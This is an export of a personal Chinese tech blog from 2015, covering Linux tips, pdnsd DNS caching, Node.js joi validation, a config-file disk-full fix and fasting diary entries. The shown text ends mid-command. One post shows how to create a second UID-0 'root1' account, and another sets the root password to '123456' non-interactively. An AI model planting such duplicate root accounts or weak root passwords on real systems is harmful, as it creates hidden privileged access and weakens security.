  "title": "linux下创建另一个root帐号",
  "timestamp": "2015-06-04 20:27:00",
  "tags": [
    "linux"
  ],
  "body": "<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">useradd -g 0 -u 0 -o root1\n</pre>\n</div>\n\n<p>\n上面的命令创建了一个和 <code>root</code> 帐号几乎一模一样的帐号 <code>root1</code> ，这个帐号登录后甚至连 <code>$USER</code> 环境变量都是 <code>root=， 应该是由于 =uid</code> 和 <code>root</code> 帐号一样都是 <code>0</code> ，所以使用了 <code>root</code> 帐号的用户名，但是可以指定不同的 <code>HOME</code> 以及密码等。</p>\n"
},
{
  "title": "今天开始ediary项目",
  "timestamp": "2015-05-30 15:26:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\n又折腾了一上午的 <a href=\"https://github.com/renard/o-blog\">o-blog</a> ，总是少了几个 <code>js</code> 文件，最近升级了 <code>emacs</code> 中的所有包后 <a href=\"http://blog.kankanan.com\">我的博客</a> 总算是歇菜了，使用 <a href=\"https://github.com/renard/o-blog\">o-blog</a> 写了两年博客，过程还是很愉快的，除了升级系统后偶尔会有兼容性问题，需要耗费时间修复外，写起博客来很方便，有时候工作相关的调研项目也忍不住发布到博客上，然后把链接发出去。不过考虑到我使用的系统（Archlinux）更新得太勤快了，使用的博客系统一定要够简单直观，我可以改得动。\n</p>\n\n<p>\n我想是时候按自已的想法写一个类似的项目了，这个项目的核心功能一定要精简，专注于日记功能，最好能把展示层剥离出去， <code>jquery</code> 和 <code>bootstrap</code> 实在是太重了，展示日志用得着这么重的东西吗？\n</p>\n\n<p>\n核心应该是数据结构，日志的信息包含：标题（title）、标签（tags）、发布日期（timestamp）、正文（source）加上可选的短名称（slug）用于生成链接。而最基础的功能就是从日志文本中提取这些信息。接下来根据这些信息来生成待发布的日志文件，以及与现有的发布系统（如：wordpress、git pages）的对接就可以独立进行开发了，而且应该可以互相替换。\n</p>\n\n<p>\n接下来要完成的第一个任务就是解析本日志文件。</p>\n"
},
{
  "title": "第一个任务解析日志文件顺利完成",
  "timestamp": "2015-05-30 16:58:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\n参考 <a href=\"https://github.com/renard/o-blog\">o-blog</a> 的代码顺利完成任务，代码量很少不到40行。貌似 o-blog 很多解析org-mode的代码都是手写的，org-mode 支持一些便捷的API，可以减少很多代码量。\n</p>\n\n<p>\n接下来要完的任务是org-mode格式的日记内容html化。</p>\n"
},
{
  "title": "第二个任务以及移植 o-blog 主要功能顺利完成",
  "timestamp": "2015-06-03 14:45:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\no-blog 的相关特性进行了一番取舍：去掉了云标签独立页面，去掉了年/月发布列表页，去掉了最新文章侧边栏，去掉了文章页面的上一文章、下一文章链接，以及选择直接在标签侧边栏高亮相关标签，新增按标签订阅，新增主页。\n</p>\n\n<p>\n接下来还有首页的页面需要按时间顺序排列，另外最好1号页码表示最旧的文章，这样发表新文章后文章所在的页码不会变来变去不利于收藏。</p>\n"
},
{
  "title": "ediary已基本可用正式在个人博客中启用",
  "timestamp": "2015-06-08 11:39:00",
  "tags": [
    "ediary"
  ],
  "body": "<p>\n经过上周末的一翻努力，参考 <a href=\"http://medium.com/\">medium</a> 的风格，对布局进行彻底的调整：\n</p>\n\n<ul class=\"org-ul\">\n<li>使用三层组织方式：category &gt; tag &gt; article\n</li>\n\n<li>article 去除干扰阅读的元素：标签云，网址中去除了时间信息\n</li>\n\n<li>category 放到一级菜单中，支持按 category 订阅\n</li>\n\n<li>移植 o-blog 中的sitemap功能\n</li>\n</ul>\n\n<p>\n接下来的任务是对主页进行正式支持，目前是手工拷贝了 category 的第一页做为首页，后面需要改为直接把 category 的第一页发布为首页，以及显示方面的BUG修复。</p>\n"
},
{
  "title": "ediary支持主页以及完成国际化（i18n）支持",
  "timestamp": "2015-06-09 15:04:00",
  "tags": [
    "ediary"
  ],
  "body": "<ul class=\"org-ul\">\n<li>完成主页支持\n\n<p>\n通过在配置文件中添加主页选项 <code>config.site.home</code> ，支持把某一个页面通过拷贝做为主页 <code>/index.html</code> 。\n</p>\n</li>\n\n<li>完成国际化支持\n\n<p>\n按照文章 <a href=\"https://research.linagora.com/blog/?p=37\">A strategy for i18n in node.js server templates</a> 的建议，选用 <a href=\"https://github.com/mashpie/i18n-node\">i18n-node</a> 做为国际化方案，顺利完成英文及中文简体的支持。\n</p>\n</li>\n</ul>\n\n<p>\n接下来要简化安装配置，并提供相关文档。</p>\n"
},
{
  "title": "linux非交互方式修改用户密码",
  "timestamp": "2015-06-16 17:35:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\nlinux下的 <code>passwd</code> 命令是交互式运行的（密码需要由用户使用键盘输入），后台程序如果要改用户密码需要一定的技巧。\n</p>\n\n<p>\n如：以下命令可以将 <code>root</code> 帐号的密码改为 <code>123456</code>\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">(<span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">'123456'</span>; sleep 1; <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">'123456'</span>) | passwd <span style=\"color: #66cccc;\">'root'</span> &gt; /dev/null\n</pre>\n</div>\n\n<p>\n但是，此时也不好判断密码是否改成功了，需要验证一下。\n</p>\n\n<p>\nlinux 系统的密码编码（不可逆）后存储在 /etc/shadow（以前是 /etc/passwd） 文件里。\n</p>\n\n<p>\n参考文章《<a href=\"http://www.xinotes.net/notes/note/1833/\">Check Linux user password in C</a> 》编写了以下程序用于非交互式修改密码：\n</p>\n\n<p>\n<a href=\"../static/change_password.c\">change_password.c</a>\n</p>\n\n<p>\n编译：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gcc -g change_password.c -o change_password -lcrypt\n</pre>\n</div>\n\n<p>\n运行：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./change_password root 123456\n</pre>\n</div>\n\n<p>\n参考：\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"http://tldp.org/HOWTO/Shadow-Password-HOWTO-2.html\">Why shadow your passwd file?</a>\n</li>\n</ul>\n"
},
{
  "title": "轻断食日（2015-6-16）",
  "timestamp": "2015-06-16 18:52:00",
  "tags": [
    "轻断食"
  ],
  "body": "<p>\n今天是第一次进行轻断食，昨天晚上10点多吃过水果后到现在还没有吃过东西，喝了一天的茶，除了偶尔觉得饿得发慌，一切安好，工作没有疲劳感效率很高，马上要吃晚饭了，希望不要吃得太多，按要求一天只能吃600卡的，等下可别吃超了哦。\n</p>\n\n<p>\n现在肚子有饿的感觉，但是又感觉肚子有点涨，搞不清楚自已到底是不是真饿了。\n</p>\n\n<p>\n现在刚好70公斤，希望慢慢瘦下来吧，过了今天明天就解放了。</p>\n"
},
{
  "title": "使用Pdnsd缓存域名解析结果加快上网速度",
  "timestamp": "2015-06-23 18:56:00",
  "tags": [
    "linux",
    "dns"
  ],
  "body": "<ul class=\"org-ul\">\n<li>频繁的域名解析容易导致超时出错\n\n<p>\n在执行 <code>opkg-cl update</code> 或 <code>yaourt -Syua</code> 命令更新系统软件信息时，容易因为频繁的域名解析而导致更新速度奇慢甚至是超时出错，通过将要访问的域名添加到 <code>/etc/hosts</code> 中，可以立即解决这个问题。考虑到服务器IP可能会换，使用 <code>/etc/hosts</code> 非长久之计。\n</p>\n</li>\n\n<li>缓存域名解析结果\n\n<p>\n更好的办法是缓存域名解析结果，一般来说后台服务程序可以通过缓存域名解析结果加快后继请求的处理，但是对于像 <code>opkg-cl</code> 、 <code>yaourt</code> 之类的工具程序，由于运行一次就退出了，要实现缓存域名解析结果就显得有点小题大作了，最好是在系统底层来实现，而不是每个应用程序都实现这个功能。\n</p>\n\n<p>\n<a href=\"http://members.home.nl/p.a.rombouts/pdnsd/\">Pdnsd</a> 就是这样一款开源DNS代理服务程序，它安装在客户机上，对于客户端应用程序来说，它是DNS服务程序，对于真正的DNS服务来说它是DNS客户端程序。\n</p>\n</li>\n\n<li><a href=\"http://members.home.nl/p.a.rombouts/pdnsd/\">Pdnsd</a> 安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S pdnsd\n</pre>\n</div>\n</li>\n\n<li><a href=\"http://members.home.nl/p.a.rombouts/pdnsd/\">Pdnsd</a> 运行\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable pdnsd\nsudo systemctl start pdnsd\n</pre>\n</div>\n</li>\n\n<li>客户机DNS设置\n\n<p>\n修改 <code>/etc/resolv.conf</code> 为如下内容：\n</p>\n\n<pre class=\"example\">\nnameserver 127.0.0.1\n</pre>\n\n<p>\n对于 Archlinux <code>/etc/resolv.conf</code> 是由 <code>resolvconf</code> 工具生成，直接修改后随时可能被覆盖，可以修改 <code>/etc/resolvconf.conf</code> 将以下配置行取消注释：\n</p>\n<pre class=\"example\">\n# name_servers=127.0.0.1\n</pre>\n\n<p>\n然后重新生成 <code>/etc/resolv.conf</code> 配置文件：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo resolvconf -u\n</pre>\n</div>\n</li>\n\n<li>看看效果\n\n<p>\n多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是DNS缓存在起作用。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">nslookup www.google.com\n</pre>\n</div>\n</li>\n\n<li>适合国内环境的配置（仅供参考）\n\n<p>\n将 <code>/etc/pdnsd.conf</code> 配置文件修改为以下内容：\n</p>\n\n<pre class=\"example\">\nglobal {\n    perm_cache=1024;\n    cache_dir=\"/var/cache/pdnsd\";\n    pid_file = /var/run/pdnsd.pid;\n    run_as=\"pdnsd\";\n    server_ip = 127.0.0.1;\n    status_ctl = on;\n    query_method=udp_tcp;\n    min_ttl=15m;\n    max_ttl=1d;\n    timeout=10;\n    neg_domain_pol=on;\n    udpbufsize=1024;\n}\n\nserver {\n    label = \"root-servers\";\n    root_server = discover;\n    randomize_servers = on;\n    ip = 114.114.114.114,\n         223.5.5.5,\n         114.114.115.115,\n         223.6.6.6;\n    timeout = 5;\n    uptest = query;\n    interval = 30m;\n    ping_timeout = 50;\n    purge_cache = off;\n    exclude = .localdomain;\n    policy = included;\n    preset = off;\n}\n\nsource {\n    owner=localhost;\n    serve_aliases=on;\n    file=\"/etc/hosts\";\n}\n\nrr {\n    name=localhost;\n    reverse=on;\n    a=127.0.0.1;\n    owner=localhost;\n    soa=localhost,root.localhost,42,86400,900,86400,86400;\n}\n</pre>\n\n<p>\n重启 <a href=\"http://members.home.nl/p.a.rombouts/pdnsd/\">Pdnsd</a> 生效配置：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart pdnsd\n</pre>\n</div>\n</li>\n\n<li>配置pdnsd使用dhcp分配的dns服务器\n\n<p>\n往往dhcp提供的dns服务器是最快的（它可能也做了缓存），用到了本地域名的情况下必须使用dhcp提供的dns服务器，\n如果将dns服务器写死在pdnsd.conf，切换网络（如从公司回到家里）就上不了网了，其实 <code>resolvconf</code> 对 <code>pdnsd</code> 提供了支持。\n</p>\n\n<p>\n参考 <code>man resolvconf</code> 将 <code>/etc/resolvconf.conf</code> 改为\n</p>\n<pre class=\"example\">\nname_servers=127.0.0.1\npdnsd_conf=/etc/pdnsd.conf\n</pre>\n\n<p>\n删掉 <code>/etc/pdnsd.conf</code> 中的所有 <code>server</code> 配置块。\n</p>\n\n<p>\n重启 <code>NetworkManager</code> 生效配置\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart NetworkManager\n</pre>\n</div>\n\n<p>\n现在 <code>/etc/pdnsd.conf</code> 中的 <code>server</code> 配置块将由 <code>resolvconf</code> 来提供。\n</p>\n</li>\n\n<li>参考\n\n<p>\n《<a href=\"http://venmos-com.qiniudn.com/blog/2013/06/19/pdnsd/\">用Pdnsd快速打造无污染高速缓存DNS服务器</a>》</p>\n</li>\n</ul>\n"
},
{
  "title": "使用node.js的对象模式验证模块joi引入强类型",
  "timestamp": "2015-07-13 18:44:00",
  "tags": [
    "node"
  ],
  "body": "<ul class=\"org-ul\">\n<li>弱类型的Javascript\n\n<p>\nJavascript是一门弱类型的语言，定义变量不需要指定类型，可以为同一个变量赋任意类型的值。误用类型不会报错，而结果会让你大吃一惊：\n</p>\n\n<pre class=\"example\">\n&gt; \"1\" + 1\n'11'\n&gt; if (\"false\") { console.log(\"yes\") } else { console.log(\"no\"); }\nyes\nundefined\n&gt;\n</pre>\n\n<p>\nredis中很多数据结构取出时都是字符串值（如：set、hash），调用方需要自行将它转换成正确的类型（如：Boolean、Date、Number），如果不转换成正确的类型会导致冗长的代码，如Boolean类型：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">if</span> ((String(model.stoped) == <span style=\"color: #66cccc;\">'true'</span>)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">Do something when stoped.</span>\n}\n</pre>\n</div>\n\n<p>\n如果手工转换成正确的类型肯定要写很多样板代码了。\n</p>\n</li>\n\n<li>对象模式验证模块 <a href=\"https://github.com/hapijs/joi#anydefaultvalue-description\">joi</a>\n\n<p>\n有很多的ORM（ Object Relational Mapping 对象关系映射）库都能够实现强类型的数据模型，但是它们都相当的复杂，支持各种各样的数据库后端，支持一对一、一对多、多对多等数据关系，但是很少支持分表分库，我们的系统一般是数据模型简单但要考虑用户量大了横向扩展，所以一开始就进行了分表分库，无法使用重型的ORM。\n</p>\n\n<p>\n如果有一个能够自动根据模式（Schema）定义对值进行类型转换的库，一定会非常有用。\n</p>\n\n<p>\n<a href=\"https://github.com/hapijs/joi#anydefaultvalue-description\">joi</a> 一个Javascript对象模式描述语言以及验证（Object schema description language and validator for JavaScript objects）的库，它可以完成对象类型转换以及合法性验证。\n</p>\n</li>\n\n<li><a href=\"https://github.com/hapijs/joi#anydefaultvalue-description\">joi</a> 的用法示例\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">joi</span> = require(<span style=\"color: #66cccc;\">'joi'</span>);\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">redis</span> = require(<span style=\"color: #66cccc;\">'redis'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = redis.createClient(6379, <span style=\"color: #66cccc;\">'127.0.0.1'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">User</span> = <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">options</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (! options) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   options = {};\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">this</span>.id = options.id || 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">this</span>.name = options.name || <span style=\"color: #66cccc;\">''</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">this</span>.male = options.male || <span style=\"color: #6699cc;\">true</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">this</span>.birthday = options.birthday;\n};\n\nUser.schema = joi.object().keys({\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   id: joi.number().integer().min(1),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   name: joi.string().required(),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   male: joi.<span style=\"color: #6699cc;\">boolean</span>().<span style=\"color: #99cc99;\">default</span>(<span style=\"color: #6699cc;\">true</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   birthday: joi.date().required()\n});\n\nUser.find = <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">id</span>, <span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.hgetall(<span style=\"color: #66cccc;\">\"user:\"</span> + id, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">value</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> <span style=\"color: #99cc99;\">if</span> (! value) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Error</span>(<span style=\"color: #66cccc;\">\"User not found\"</span>));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   joi.validate(value, User.schema, callback);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n};\n\nUser.<span style=\"color: #6699cc;\">prototype</span>.save = <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">value</span> = {};\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span>(<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">fieldName</span> <span style=\"color: #99cc99;\">in</span> <span style=\"color: #6699cc;\">this</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (<span style=\"color: #99cc99;\">typeof</span>(<span style=\"color: #6699cc;\">this</span>[fieldName]) != <span style=\"color: #66cccc;\">'function'</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   value[fieldName] = <span style=\"color: #6699cc;\">this</span>[fieldName];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   joi.validate(value, User.schema, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">validatedValue</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.hmset(<span style=\"color: #66cccc;\">\"user:\"</span> + validatedValue.id, validatedValue, callback);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n};\n\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">user</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">User</span>({\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   id: 1,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   name: <span style=\"color: #66cccc;\">\"txf\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   male: <span style=\"color: #6699cc;\">true</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   birthday: <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Date</span>(<span style=\"color: #66cccc;\">\"1983-03-22\"</span>)\n});\n\nuser.save(<span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(<span style=\"color: #66cccc;\">\"user save error(\"</span> + err.toString() + <span style=\"color: #66cccc;\">\")\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.quit();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.info(<span style=\"color: #66cccc;\">\"user saved\"</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   User.find(user.id, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">user</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.quit();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(<span style=\"color: #66cccc;\">\"user find error(\"</span> + err.toString() + <span style=\"color: #66cccc;\">\")\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">\"user found: \"</span> + JSON.stringify(user));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n});\n</pre>\n</div>\n\n<p>\n运行结果：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">user saved\nuser found: {<span style=\"color: #66cccc;\">\"id\"</span>:1,<span style=\"color: #66cccc;\">\"name\"</span>:<span style=\"color: #66cccc;\">\"txf\"</span>,<span style=\"color: #66cccc;\">\"male\"</span>:<span style=\"color: #6699cc;\">true</span>,<span style=\"color: #66cccc;\">\"birthday\"</span>:<span style=\"color: #66cccc;\">\"1983-03-22T00:00:00.000</span><span style=\"color: #66cccc; text-decoration: underline;\">Z\"</span><span style=\"text-decoration: underline;\">}</span>\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "轻断食日（2015-7-17）",
  "timestamp": "2015-07-17 14:28:00",
  "tags": [
    "轻断食"
  ],
  "body": "<p>\n今天是轻断食日，昨天晚上10点多吃过水果后到现在还没有吃过东西，上午起得很晚，最近工作太累了。中午忘点餐干脆断食算了，下一顿要到18点的晚餐，已经泡好了下午茶，肚子有点撑（为什么不觉得很饿呢？），有时候又会觉得肚子有点饿得慌，但仔细一体会其实是最近因为工作有点焦虑。\n</p>\n\n<p>\n现在是66.5公斤，主要是肚子瘦了些，继续加油。</p>\n"
},
{
  "title": "config库避免磁盘满时配置文件被截断",
  "timestamp": "2015-07-20 17:35:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n<a href=\"https://github.com/tangxinfa/config\">config</a> 库在实际使用过程中发现一个问题：磁盘满时写配置文件可能导致配置文件被清空（文件大小为0）。\n</p>\n\n<p>\n想到两种方案：\n</p>\n\n<ul class=\"org-ul\">\n<li>写-替换\n\n<p>\n先写到一个临时文件，写成功后替换目标文件，这是由linux下重命名（rename）文件的原子性保证的。由于我们是通过对配置文件加锁的方式支持多进程访问的，可以对配置文件使用独立的锁文件，一想起到配置文件目录里将出现一大堆锁文件，胃就不舒服。\n</p>\n</li>\n\n<li>预分配空间\n\n<p>\n先确保文件拥有足够的空间再写入。虽然不是原子性的，但已经能够解决问题。我比较倾向于这个方案。\n</p>\n</li>\n</ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">通过预分配空间方式安全写文件算法</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>如果当前文件过小（不足以容纳新内容），在文件尾部通过追加占位字符（\\0）直到文件大小合适\n</li>\n\n<li>写入新内容\n</li>\n\n<li>将过多的空间截掉\n</li>\n</ul>\n\n<p>\n具体实现参见： <a href=\"https://github.com/tangxinfa/config/commit/5ed686fc42c3356658d67d2d3bb59d3435f8c68f\">5ed686f Fix bug: config file content missing when disk full</a> .\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">测试</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n</div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">创建模拟磁盘目录 /mnt/disk</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<p>\n先确保存在 <code>/dev/loop*</code> 设备，如果不存在先尝试挂载 <code>loop</code> 内核模块\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo modprobe loop\n</pre>\n</div>\n\n<p>\n如果还是没有 <code>loop</code> 设备，可能是最近进行了系统升级，重启后再试。\n</p>\n\n<p>\n创建模拟磁盘（/mnt/disk）：\n</p>\n\n<pre class=\"example\">\n$ sudo dd if=/dev/zero of=~/Examples/disk.img bs=8M count=1\n$ sudo losetup /dev/loop0 ~/Examples/disk.img\n$ sudo parted /dev/loop0\nGNU Parted 3.2\nUsing /dev/loop0\nWelcome to GNU Parted! Type 'help' to view a list of commands.\n(parted) mklabel gpt\nWarning: The existing disk label on /dev/loop0 will be destroyed and all data on\nthis disk will be lost. Do you want to continue?\nYes/No? yes\n(parted) mkpart primary 0MB 8MB\nWarning: The resulting partition is not properly aligned for best performance.\nIgnore/Cancel? Ignore\n(parted) print\nModel: Loopback device (loopback)\nDisk /dev/loop0: 8389kB\nSector size (logical/physical): 512B/512B\nPartition Table: gpt\nDisk Flags: \n\nNumber  Start   End     Size    File system  Name  Flags\n 1      17.4kB  8372kB  8354kB\n\n(parted) quit\n$ sudo mkfs.ext4 /dev/loop0p1\n$ sudo mkdir /mnt/disk\n$ sudo mount /dev/loop0p1 /mnt/disk\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">修复前</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n磁盘空间不足写配置导致配置文件被损坏\n</p>\n\n<pre class=\"example\">\n$ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig\nname: libconfig\n$ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000\ndd: error writing ‘/mnt/disk/other.data’: No space left on device\n6821889+0 records in\n6821888+0 records out\n6821888 bytes (6.8 MB) copied, 7.44769 s, 916 kB/s\ndd: error writing ‘/mnt/disk/other.data’: No space left on device\n6821889+0 records in\n6821888+0 records out\n6821888 bytes (6.8 MB) copied, 7.53017 s, 906 kB/s\n$ sudo ~/Opensource/config/config /mnt/disk/test.json set data 